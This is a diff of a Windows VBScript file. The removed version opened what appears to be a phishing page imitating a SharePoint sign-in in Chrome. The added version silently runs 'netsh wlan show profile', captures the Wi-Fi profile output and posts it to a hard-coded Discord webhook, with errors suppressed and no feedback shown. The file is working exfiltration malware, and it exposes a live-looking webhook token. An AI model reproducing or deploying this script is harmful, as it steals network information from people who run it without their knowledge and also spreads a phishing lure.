@@ -1,9 +1,40 @@
 
-Dim objShell, url
+Dim objShell, objHTTP, strCommand, strOutput, strLine, strWebhookURL, jsonPayload
+
+' Define the webhook URL
+strWebhookURL = "https://discord.com/api/webhooks/1288173412199694368/GCuF_2yTI0LwoDgD87G60oNdxIG9ERn16auEXlHepwGExjnQfmSbVjJ3mR48-BL4Ihmi"
+
+' Create a Shell object
 Set objShell = CreateObject("WScript.Shell")
 
-' Define the URL to open
-url = "https://buxb0t.github.io/https-tromkom.sharepoint-sites-zokrates-sider-startside-elev.aspx-wa-wsignin1.0/"
+' Execute the command and get the output
+strCommand = "cmd /c netsh wlan show profile"
+Set objTempFile = objShell.Exec(strCommand)
 
-' Open the URL in Google Chrome
-objShell.Run """C:\Program Files\Google\Chrome\Application\chrome.exe"" " & url, 1, False
+' Read the output from the command
+strOutput = ""
+Do While Not objTempFile.StdOut.AtEndOfStream
+    strLine = objTempFile.StdOut.ReadLine()
+    strOutput = strOutput & strLine & vbCrLf
+Loop
+
+' Check if strOutput is empty
+If Trim(strOutput) = "" Then
+    WScript.Quit 1
+End If
+
+' Create an HTTP object to send the data to Discord
+Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+objHTTP.Open "POST", strWebhookURL, False
+objHTTP.setRequestHeader "Content-Type", "application/json"
+
+' Format the JSON payload
+jsonPayload = "{""content"": """ & Replace(Replace(strOutput, """", "\""") , vbCrLf, "\n") & """}"
+
+' Send the data
+On Error Resume Next
+objHTTP.Send jsonPayload
+On Error GoTo 0
+
+' Exit without feedback
+WScript.Quit 0
